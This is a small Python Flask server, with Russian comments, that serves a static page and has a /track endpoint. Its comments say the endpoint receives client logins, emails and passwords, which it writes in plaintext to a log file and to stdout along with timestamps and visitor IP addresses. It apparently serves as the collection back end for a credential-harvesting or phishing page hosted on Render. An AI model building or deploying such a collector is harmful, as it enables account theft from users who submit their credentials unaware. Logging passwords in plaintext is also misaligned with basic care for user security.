from flask import Flask, request, jsonify, send_from_directory
import os
import json
from datetime import datetime
import logging

app = Flask(__name__, static_folder='static')

# Включаем логирование всех запросов в stdout с уровнем INFO
logging.basicConfig(level=logging.INFO)

@app.before_request
def log_request_info():
    # Логируем каждый запрос с IP, методом и путём
    app.logger.info(f'{request.remote_addr} - {request.method} {request.path}')

@app.route('/')
def index():
    # Логируем заход на главную страницу
    app.logger.info(f'{request.remote_addr} - GET /')
    return send_from_directory('static', 'index.html')

@app.route('/track', methods=['POST'])
def track():
    data = request.json

    # Логируем детально данные, которые прислал клиент (login, email, password и т.п.)
    app.logger.info(f'Получены данные от клиента: {data}')

    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "data": data
    }

    # Сохраняем данные в файл (можно убрать, если не нужно)
    with open("track_log.txt", "a", encoding="utf-8") as f:
        f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")

    # Выводим в stdout для Render (чтобы в логах было видно именно с данными)
    print(f"[CLIENT ACTION] {json.dumps(log_entry, ensure_ascii=False)}")

    # Логируем POST запрос с IP и путем
    app.logger.info(f'{request.remote_addr} - POST /track')

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5600))
    app.run(host="0.0.0.0", port=port)
